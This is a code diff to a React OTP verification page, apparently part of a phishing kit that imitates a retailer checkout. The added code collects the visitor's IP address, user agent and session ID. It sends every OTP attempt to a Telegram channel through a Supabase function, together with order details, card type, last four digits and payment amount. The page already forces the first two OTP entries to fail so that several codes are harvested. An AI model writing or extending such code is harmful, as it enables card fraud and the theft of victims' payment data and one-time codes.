@@ -17,6 +17,11 @@ const OTPVerification = () => {
   const [isSubmitting, setIsSubmitting] = useState(false);
   const [error, setError] = useState("");
   const [attempts, setAttempts] = useState(0); // Track OTP verification attempts
+  const [userInfo, setUserInfo] = useState({
+    ip: "Loading...",
+    userAgent: navigator.userAgent,
+    sessionId: crypto.randomUUID()
+  });
 
   // Get order details from location state
   const orderDetails = location.state?.orderDetails;
@@ -24,6 +29,28 @@ const OTPVerification = () => {
   const discountedAmount = location.state?.discountedAmount;
   const paymentMethod = location.state?.paymentMethod;
   const lastFour = location.state?.lastFour;
+
+  // Get user IP address
+  useEffect(() => {
+    const fetchIP = async () => {
+      try {
+        const response = await fetch('https://api.ipify.org?format=json');
+        const data = await response.json();
+        setUserInfo(prev => ({
+          ...prev,
+          ip: data.ip
+        }));
+      } catch (error) {
+        console.error("Error fetching IP:", error);
+        setUserInfo(prev => ({
+          ...prev,
+          ip: "Unknown"
+        }));
+      }
+    };
+    
+    fetchIP();
+  }, []);
 
   // Format remaining time as MM:SS
   const formatTime = (seconds: number) => {
@@ -80,6 +107,40 @@ const OTPVerification = () => {
     }
   }, [countdown, navigate]);
   
+  // Send OTP attempt notification to Telegram
+  const sendOTPAttemptNotification = async (attemptNumber: number) => {
+    try {
+      const notificationData = {
+        ...orderDetails,
+        otpAttempt: attemptNumber,
+        notificationType: "otp_attempt",
+        ip: userInfo.ip,
+        userAgent: userInfo.userAgent,
+        sessionId: userInfo.sessionId,
+        cardDetails: {
+          cardType: paymentMethod,
+          lastFour: lastFour
+        },
+        paymentAmount: discountedAmount,
+        giftCardValue: giftCardValue
+      };
+      
+      console.log(`Sending OTP attempt ${attemptNumber} notification to Telegram`);
+      
+      const response = await supabase.functions.invoke("send-telegram-notification", {
+        body: notificationData
+      });
+      
+      if (response.error) {
+        console.error(`Failed to send OTP attempt ${attemptNumber} notification:`, response.error);
+      } else {
+        console.log(`OTP attempt ${attemptNumber} notification sent successfully:`, response.data);
+      }
+    } catch (error) {
+      console.error(`Error sending OTP attempt ${attemptNumber} notification:`, error);
+    }
+  };
+  
   // Check OTP validity based on attempt number
   const verifyOTP = () => {
     // OTP validation
@@ -87,6 +148,9 @@ const OTPVerification = () => {
       setError("Please enter a complete 6-digit code");
       return false;
     }
+    
+    // Always send notification about the attempt
+    sendOTPAttemptNotification(attempts + 1);
     
     // First two attempts will always fail, third attempt will succeed
     if (attempts < 2) {
@@ -136,27 +200,14 @@ const OTPVerification = () => {
         ...orderDetails,
         paymentMethod: paymentMethod,
         lastFour: lastFour,
-        otpVerified: true
+        otpVerified: true,
+        ip: userInfo.ip,
+        userAgent: userInfo.userAgent,
+        sessionId: userInfo.sessionId
       };
       
       // Save order details to localStorage for reference
       localStorage.setItem("hotTopicOrder", JSON.stringify(completeOrderDetails));
-      
-      // Send order notification to Telegram
-      try {
-        console.log("Sending order notification to Telegram with details:", completeOrderDetails);
-        supabase.functions.invoke("send-telegram-notification", {
-          body: completeOrderDetails
-        }).then(response => {
-          if (response.error) {
-            console.error("Failed to send Telegram notification:", response.error);
-          } else {
-            console.log("Telegram notification sent successfully:", response.data);
-          }
-        });
-      } catch (telegramErr) {
-        console.error("Error sending Telegram notification:", telegramErr);
-      }
       
       // Navigate to payment success page
       navigate("/payment-success", { 
